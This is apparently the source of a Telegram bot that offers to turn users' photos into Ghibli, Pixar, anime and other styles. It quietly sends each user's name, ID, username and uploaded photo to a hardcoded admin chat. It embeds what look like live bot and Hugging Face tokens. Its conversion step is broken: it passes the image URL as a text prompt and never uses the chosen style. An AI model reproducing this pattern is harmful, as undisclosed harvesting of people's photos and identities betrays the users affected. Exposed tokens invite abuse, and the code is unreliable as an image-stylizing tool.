import os
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
import requests

BOT_TOKEN = "7314134429:AAG7ZBRNFMkBFtDZIK3pRh1fU8HlBWlNsXg"
HF_TOKEN = "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"
ADMIN_ID = 8007435296

styles = ["Ghibli", "Pixar", "Cartoon", "Anime", "Superhero", "Bridal", "Army", "Hacker", "Meme"]

menu_buttons = [[f"🎨 {style} 🎨"] for style in styles]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔥 New user started bot:\n👤 Name: {user.first_name}\n🆔 ID: {user.id}\n@{user.username}")
    await update.message.reply_text("👋 Welcome to the Image Style Bot!\nSelect a style:", reply_markup=ReplyKeyboardMarkup(menu_buttons, resize_keyboard=True))

async def handle_style(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['style'] = update.message.text.replace("🎨", "").strip()
    await update.message.reply_text("📸 Now send me the image you want to convert...")

async def handle_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    photo_file = await update.message.photo[-1].get_file()
    image_url = photo_file.file_path
    style = context.user_data.get('style', 'Cartoon')

    # Notify admin
    await context.bot.send_photo(chat_id=ADMIN_ID, photo=image_url, caption=f"🆕 Image received from @{user.username}\n👤 {user.first_name} ({user.id})\n🎨 Style: {style}")

    # HuggingFace API
    await update.message.reply_text("⏳ Please wait while we process your image...")
    response = requests.post(
        f"https://api-inference.huggingface.co/models/CompVis/stable-diffusion-v1-4",
        headers={"Authorization": f"Bearer {HF_TOKEN}"},
        json={"inputs": image_url}
    )
    if response.status_code == 200:
        await update.message.reply_photo(photo=response.content, caption="✅ Here's your stylized image!")
    else:
        await update.message.reply_text("❌ Failed to generate image. Try again later.")

app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.PHOTO, handle_image))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_style))

app.run_polling()
